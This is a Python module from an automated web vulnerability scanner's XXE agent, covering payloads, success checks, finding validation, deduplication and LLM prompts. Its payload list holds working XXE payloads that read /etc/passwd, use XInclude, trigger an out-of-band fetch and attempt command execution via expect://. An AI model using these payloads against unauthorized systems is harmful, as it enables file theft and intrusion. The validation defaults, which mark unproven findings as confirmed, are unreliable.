"""
XXE Agent - PURE functions

All functions here are free functions (no self), take all data as parameters,
and perform no I/O. They are deterministic and side-effect free.

Responsibilities:
- XML entity payload definitions
- XXE success indicator checking
- Validation status determination
- Finding creation and fingerprinting
- Report building
- LLM prompt generation
"""

import json
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse


# ============================================================================
# PAYLOAD CONSTANTS
# ============================================================================

# PURE: Baseline XXE payloads for initial testing
INITIAL_XXE_PAYLOADS: List[str] = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe "BUGTRACE_XXE_CONFIRMED" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "bar" "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_bugtrace_test">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param_xxe SYSTEM "http://127.0.0.1:5150/nonexistent_oob"> %param_xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
]

# PURE: XXE success indicators in response text
XXE_SUCCESS_INDICATORS: List[str] = [
    "root:x:0:0",                     # /etc/passwd success
    "BUGTRACE_XXE_CONFIRMED",         # Internal Entity success
    "[extensions] found",              # Win.ini success
    "failed to load external entity",  # Error-based success
    "No such file or directory",       # Error-based success
    "uid=0(root)",                     # RCE success (expect://)
    "XXE OOB Triggered",              # Blind Detection (Simulated)
]

# PURE: XXE payload markers for validation
XXE_PAYLOAD_MARKERS: List[str] = [
    '<!ENTITY', '<!DOCTYPE', 'SYSTEM', 'file://', 'http://', '&xxe;', '<?xml',
]


# ============================================================================
# RESPONSE ANALYSIS (PURE)
# ============================================================================

# PURE
def check_xxe_indicators(text: str) -> bool:
    """
    Check response text for XXE success indicators.

    Args:
        text: HTTP response body text

    Returns:
        True if any XXE success indicator found
    """
    for indicator in XXE_SUCCESS_INDICATORS:
        if indicator in text:
            return True

    # Check for XInclude reflection
    if "root:x:0:0" in text:
        return True

    return False


# ============================================================================
# VALIDATION STATUS (PURE)
# ============================================================================

# PURE
def determine_validation_status(payload: str, evidence: str = "success") -> str:
    """
    Determine tiered validation status for XXE finding.

    TIER 1 (VALIDATED_CONFIRMED): Definitive proof
        - File content exfiltrated (/etc/passwd)
        - OOB callback received (Interactsh hit)
        - DTD loaded with external entity

    TIER 2 (PENDING_VALIDATION): Needs verification
        - Error-based XXE (shows path but not content)
        - Blind XXE without OOB confirmation

    Args:
        payload: XXE payload used
        evidence: Evidence string from test

    Returns:
        Validation status string
    """
    from bugtrace.core.validation_status import ValidationStatus

    # TIER 1: File disclosure confirmed
    if "passwd" in payload or "root:x:" in evidence:
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 1: OOB callback triggered
    if "Triggered" in evidence or "oob" in evidence.lower():
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 1: DTD loaded successfully
    if "dtd" in payload.lower() and "loaded" in evidence.lower():
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 1: Entity confirmed in response
    if "BUGTRACE_XXE_CONFIRMED" in evidence:
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 2: Error-based XXE
    if "failed to load" in evidence.lower() or "no such file" in evidence.lower():
        return ValidationStatus.PENDING_VALIDATION.value

    # Default: High-confidence specialist trust
    return ValidationStatus.VALIDATED_CONFIRMED.value


# PURE
def get_validation_status_from_evidence(evidence: Dict) -> str:
    """
    Determine validation status from evidence dictionary.

    Used by queue consumer for standardized event emission.

    Args:
        evidence: Evidence dict with boolean flags

    Returns:
        Validation status string
    """
    from bugtrace.core.validation_status import ValidationStatus

    # TIER 1: File content exfiltrated
    if evidence.get("file_content"):
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 1: OOB hit confirmed
    if evidence.get("oob_hit") or evidence.get("interactsh_hit"):
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 1: DTD loaded successfully
    if evidence.get("dtd_loaded"):
        return ValidationStatus.VALIDATED_CONFIRMED.value

    # TIER 2: Error-based (needs verification)
    if evidence.get("error_based"):
        return ValidationStatus.PENDING_VALIDATION.value

    # Default: High-confidence
    return ValidationStatus.VALIDATED_CONFIRMED.value


# ============================================================================
# FINDING VALIDATION (PURE)
# ============================================================================

# PURE
def validate_xxe_finding(finding: Dict) -> Tuple[bool, str]:
    """
    XXE-specific validation logic.

    Validates:
    1. Has XXE evidence (file content, OOB callback, entity resolved)
    2. Payload contains XML entity patterns

    Args:
        finding: Finding dict to validate

    Returns:
        Tuple of (is_valid, error_message)
    """
    nested = finding.get("finding", {})
    evidence = finding.get("evidence", nested.get("evidence", {}))
    status = finding.get("status", nested.get("status", ""))

    # XXE-specific: Must have evidence or confirmed status
    if status not in ["VALIDATED_CONFIRMED", "PENDING_VALIDATION"]:
        has_file = "root:x:" in str(evidence) or "passwd" in str(evidence)
        has_oob = evidence.get("interactsh_callback") if isinstance(evidence, dict) else False
        has_entity = "BUGTRACE_XXE" in str(evidence)
        if not (has_file or has_oob or has_entity):
            return False, "XXE requires proof: file content, OOB callback, or entity resolved"

    # XXE-specific: Payload should contain XML entity patterns
    payload = finding.get("payload", nested.get("payload", ""))
    if payload and not any(m in str(payload) for m in XXE_PAYLOAD_MARKERS):
        return False, f"XXE payload missing XML entity patterns: {payload[:50]}"

    return True, ""


# ============================================================================
# FINDING CONSTRUCTION (PURE)
# ============================================================================

# PURE
def create_finding(
    url: str,
    payload: str,
    successful_payloads: List[str] = None,
) -> Dict:
    """
    Create an XXE finding dictionary.

    Args:
        url: Target URL
        payload: Best/primary XXE payload
        successful_payloads: All successful payloads

    Returns:
        Complete finding dict
    """
    from bugtrace.reporting.standards import get_cwe_for_vuln, get_remediation_for_vuln

    severity = "HIGH"
    if "passwd" in payload or "XInclude" in payload:
        severity = "CRITICAL"

    return {
        "type": "XXE",
        "url": url,
        "payload": payload,
        "description": (
            f"XML External Entity (XXE) vulnerability detected. "
            f"Payload allows reading local files or triggering SSRF. Severity: {severity}"
        ),
        "severity": severity,
        "validated": True,
        "status": determine_validation_status(payload),
        "successful_payloads": successful_payloads or [payload],
        "reproduction": f"curl -X POST '{url}' -H 'Content-Type: application/xml' -d '{payload[:150]}...'",
        "cwe_id": get_cwe_for_vuln("XXE"),
        "remediation": get_remediation_for_vuln("XXE"),
        "cve_id": "N/A",
        "http_request": f"POST {url}\nContent-Type: application/xml\n\n{payload[:200]}",
        "http_response": "Local file content or entity reference detected in response",
    }


# ============================================================================
# FINGERPRINTING (PURE)
# ============================================================================

# PURE
def generate_xxe_fingerprint(url: str) -> Tuple:
    """
    Generate XXE finding fingerprint for expert deduplication.

    XXE in XML endpoints is typically tied to the endpoint itself,
    not specific parameters.

    Args:
        url: Target URL

    Returns:
        Tuple of (scheme, host, path, 'XXE') for deduplication
    """
    parsed = urlparse(url)
    normalized_path = parsed.path.rstrip('/')
    return (parsed.scheme, parsed.netloc, normalized_path, "XXE")


# PURE
def fallback_fingerprint_dedup(wet_findings: List[Dict]) -> List[Dict]:
    """
    Fallback fingerprint-based deduplication (no LLM).

    Uses URL + endpoint_type to identify duplicates.

    Args:
        wet_findings: All findings from queue

    Returns:
        Deduplicated findings list
    """
    seen_fingerprints: set = set()
    dry_list: List[Dict] = []

    for finding_data in wet_findings:
        url = finding_data.get("url", "")
        if not url:
            continue

        if finding_data.get("_discovered"):
            endpoint_type = finding_data.get("endpoint_type", "generic")
            parsed = urlparse(url)
            fingerprint = (parsed.scheme, parsed.netloc, parsed.path.rstrip('/'), endpoint_type)
        else:
            fingerprint = generate_xxe_fingerprint(url)

        if fingerprint not in seen_fingerprints:
            seen_fingerprints.add(fingerprint)
            dry_list.append(finding_data)

    return dry_list


# ============================================================================
# REPORT BUILDING (PURE)
# ============================================================================

# PURE
def build_specialist_report(
    agent_name: str,
    scan_context: str,
    dry_findings: List[Dict],
    findings: List[Dict],
) -> Dict:
    """
    Build specialist report dictionary for XXE findings.

    Args:
        agent_name: Name of the agent
        scan_context: Scan identifier
        dry_findings: DRY (deduplicated) findings
        findings: All findings from Phase B

    Returns:
        Report dict ready for serialization
    """
    from datetime import datetime

    return {
        "agent": agent_name,
        "timestamp": datetime.now().isoformat(),
        "scan_context": scan_context,
        "phase_a": {
            "wet_count": len(dry_findings) + (len(findings) if findings else 0),
            "dry_count": len(dry_findings),
            "duplicates_removed": 0,
            "dedup_method": "llm_with_fingerprint_fallback",
        },
        "phase_b": {
            "validated_count": len([f for f in findings if f.get("validated")]),
            "pending_count": len([f for f in findings if not f.get("validated")]),
            "total_findings": len(findings),
        },
        "findings": findings,
    }


# PURE
def build_dedup_prompt(
    wet_findings: List[Dict],
    tech_stack: Dict,
    prime_directive: str,
    dedup_context: str,
    xml_parser: str,
) -> Tuple[str, str]:
    """
    Build LLM prompt and system prompt for XXE deduplication.

    Args:
        wet_findings: WET findings to deduplicate
        tech_stack: Technology stack context
        prime_directive: Agent-specific prime directive
        dedup_context: Agent-specific dedup context
        xml_parser: Inferred XML parser name

    Returns:
        Tuple of (user_prompt, system_prompt)
    """
    lang = tech_stack.get('lang', 'generic')
    server = tech_stack.get('server', 'generic')

    prompt = f"""You are analyzing {len(wet_findings)} potential XXE endpoints.

{prime_directive}

{dedup_context}

## TARGET CONTEXT
- Language: {lang}
- Server: {server}
- Likely XML Parser: {xml_parser}

## DEDUPLICATION RULES

1. **CRITICAL - Autonomous Discovery:**
   - If items have "_discovered": true, they are DIFFERENT XXE ENDPOINTS discovered autonomously
   - Even if they share the same "finding" object, treat them as SEPARATE based on "url" and "endpoint_type"
   - Same URL + DIFFERENT endpoint_type -> DIFFERENT (keep all)
   - Different URLs -> DIFFERENT (keep all)

2. **Endpoint-Based Deduplication:**
   - Same URL + Same endpoint_type -> DUPLICATE (keep best)
   - Different XML parsing contexts -> DIFFERENT (keep both)

3. **Prioritization:**
   - file_upload_xml > multipart_form > xml_api_endpoint > generic_xml_test
   - Rank by likelihood of XXE based on tech stack

WET LIST:
{json.dumps(wet_findings, indent=2)}

Return JSON array of UNIQUE findings only:
{{
  "findings": [...],
  "duplicates_removed": <count>,
  "reasoning": "Brief explanation of dedup decisions"
}}"""

    system_prompt = f"""You are an expert security analyst specializing in XXE deduplication.

{prime_directive}

Focus on endpoint-based deduplication. Different XXE endpoints = different vulnerabilities.
Respect the "_discovered": true flag - these are autonomously discovered endpoints and should NOT be deduplicated unless they are truly identical."""

    return prompt, system_prompt


# ============================================================================
# EVIDENCE BUILDING (PURE)
# ============================================================================

# PURE
def build_evidence_from_result(result: Dict) -> Dict:
    """
    Build evidence dict from a queue result for validation status determination.

    Args:
        result: XXE test result dict

    Returns:
        Evidence dict with boolean flags
    """
    payload = result.get("payload", "")
    http_response = result.get("http_response", "")

    return {
        "file_content": "root:x:" in http_response or "passwd" in payload,
        "oob_hit": "oob" in http_response.lower() or "triggered" in http_response.lower(),
        "dtd_loaded": "dtd" in payload.lower(),
        "error_based": "failed to load" in http_response.lower() or "no such file" in http_response.lower(),
    }
